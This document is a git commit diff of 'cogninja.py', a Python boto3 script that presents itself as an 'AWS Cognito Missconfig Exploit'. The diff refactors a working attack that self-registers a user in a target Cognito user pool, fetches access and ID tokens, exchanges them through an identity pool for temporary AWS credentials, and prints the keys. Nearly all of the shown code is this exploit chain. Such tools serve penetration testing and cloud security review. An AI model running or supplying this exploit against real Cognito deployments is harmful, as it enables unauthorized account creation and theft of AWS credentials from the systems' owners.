d001bbcef94a8a12bb22cdc8ef49b050d9bb73f6
lv4rela <120571210+lv4rela@users.noreply.github.com>
2024-07-25 13:01:58 -0300

    Update cogninja.py

--- cogninja.py
+++ cogninja.py
@@ -2,16 +2,20 @@ import argparse
 import boto3
 from botocore.exceptions import ClientError
 from colorama import Fore, Style, init
+
 init(autoreset=True)
 
-def sign_up_user(cognito_idp_client, user_pool_client_id, username, password, email,birthdate):
+def sign_up_user(cognito_idp_client, user_pool_client_id, username, password, email, birthdate, given_name, family_name):
     try:
         response = cognito_idp_client.sign_up(
             ClientId=user_pool_client_id,
             Username=username,
             Password=password,
             UserAttributes=[
-                {'Name': 'email', 'Value': email},{'Name':'birthDate', 'Value': birthdate}
+                {'Name': 'email', 'Value': email},
+                {'Name': 'birthdate', 'Value': birthdate},
+                {'Name': 'given_name', 'Value': given_name},
+                {'Name': 'family_name', 'Value': family_name}
             ]
         )
         print(f"{Fore.GREEN}[USER SIGNED UP SUCCESSFULLY]")
@@ -44,7 +48,10 @@ def get_access_token(cognito_idp_client, user_pool_client_id, username, password
         print(f"{Fore.RED}[ERROR] - Error executing command: {e}")
         return None, None
 
-def get_identity_id(cognito_identity_client, identity_pool_id, id_token, user_pool_id, region):
+def get_identity_id(cognito_identity_client, identity_pool_id, id_token, region, user_pool_id):
+    if not identity_pool_id:
+        print(f"{Fore.RED}[ERROR] - Identity Pool ID is required but was not provided.")
+        return None
     try:
         response = cognito_identity_client.get_id(
             IdentityPoolId=identity_pool_id,
@@ -72,11 +79,8 @@ def get_aws_credentials(cognito_identity_client, identity_id, id_token, user_poo
         print(f"{Fore.RED}[ERROR] - Error executing command: {e}")
         return None
 
-if __name__ == "__main__":
-   
 
-
- def main_menu():
+def main_menu():
     ninja_ascii = r'''
                                     ####///.                                   
                                 #########////////*                              
@@ -118,37 +122,65 @@ if __name__ == "__main__":
     print(f"{Fore.YELLOW}[INFO] - Welcome to Cogninja - AWS Cognito Missconfig Exploit")
     print(f"{Fore.YELLOW}[INFO] - Author: {Fore.WHITE}@lv4rela\n")
 
-    parser = argparse.ArgumentParser(description='Cogninja - HELP')
+    parser = argparse.ArgumentParser(description='Cogninja - AWS Cognito User Management Script')
     parser.add_argument('--user_pool_client_id', type=str, required=True, help='ID of the Cognito user pool client.')
-    parser.add_argument('--user_pool_id', type=str, required=False, help='ID of the Cognito user pool.')
-    parser.add_argument('--username', type=str, required=True, help='Cognito username for the new user, if the user already exist, just use the same')
-    parser.add_argument('--password', type=str, required=True, help='Cognito user password, if the user already exist, just use the same')
+    parser.add_argument('--user_pool_id', type=str, required=True, help='ID of the Cognito user pool.')
+    parser.add_argument('--username', type=str, required=True, help='Cognito username for the new user, if the user already exists, just use the same')
+    parser.add_argument('--password', type=str, required=True, help='Cognito user password, if the user already exists, just use the same')
     parser.add_argument('--email', type=str, required=True, help='Email for the new user.')
     parser.add_argument('--region', type=str, required=True, help='AWS Cognito region.')
-    parser.add_argument('--identity_pool_id', type=str, required=False, help='Cognito Identity ID (required for Get_AWS_Credentials action)')
-    parser.add_argument('--birthdate', type=str, required=False, help='birthdate to use as attribute for the new user')
+    parser.add_argument('--identity_pool_id', type=str, required=False, help='Cognito Identity Pool ID (required for Get_AWS_Credentials action)')
+    parser.add_argument('--birthdate', type=str, required=False, help='[Optional] birthdate to use as an attribute for the new user')
+    parser.add_argument('--given_name', type=str, required=False, help='[Optional] given_name to use as an attribute for the new user')
+    parser.add_argument('--family_name', type=str, required=False, help='[Optional] family_name to use as an attribute for the new user')
 
     args = parser.parse_args()
 
-    # Create boto3 clients
+    
     cognito_idp_client = boto3.client('cognito-idp', region_name=args.region)
     cognito_identity_client = boto3.client('cognito-identity', region_name=args.region)
 
     # Try to sign up the user
-    sign_up_success = sign_up_user(cognito_idp_client, args.user_pool_client_id, args.username, args.password, args.email, args.birthdate)
+    sign_up_success = sign_up_user(
+        cognito_idp_client,
+        args.user_pool_client_id,
+        args.username,
+        args.password,
+        args.email,
+        args.birthdate,
+        args.given_name,
+        args.family_name
+    )
     
     # Always attempt to get tokens
-    access_token, id_token = get_access_token(cognito_idp_client, args.user_pool_client_id, args.username, args.password)
+    access_token, id_token = get_access_token(
+        cognito_idp_client,
+        args.user_pool_client_id,
+        args.username,
+        args.password
+    )
     
     if access_token and id_token:
         print(f"{Fore.MAGENTA}[ACCESS TOKEN]: {Fore.GREEN}{access_token}")
         print(f"{Fore.MAGENTA}[ID TOKEN]: {Fore.GREEN}{id_token}")
 
-
-        identity_id = get_identity_id(cognito_identity_client, args.identity_pool_id, id_token, args.user_pool_id, args.region)
+        # Get the identity ID
+        identity_id = get_identity_id(
+            cognito_identity_client,
+            args.identity_pool_id,
+            id_token,
+            args.region,
+            args.user_pool_id
+        )
         
         if identity_id:
-            aws_credentials = get_aws_credentials(cognito_identity_client, identity_id, id_token, args.user_pool_id, args.region)
+            aws_credentials = get_aws_credentials(
+                cognito_identity_client,
+                identity_id,
+                id_token,
+                args.user_pool_id,
+                args.region
+            )
             if aws_credentials:
                 print(f"{Fore.MAGENTA}[AWS CREDENTIALS]:")
                 print(f"  {Fore.CYAN}AccessKeyId: {aws_credentials['AccessKeyId']}")
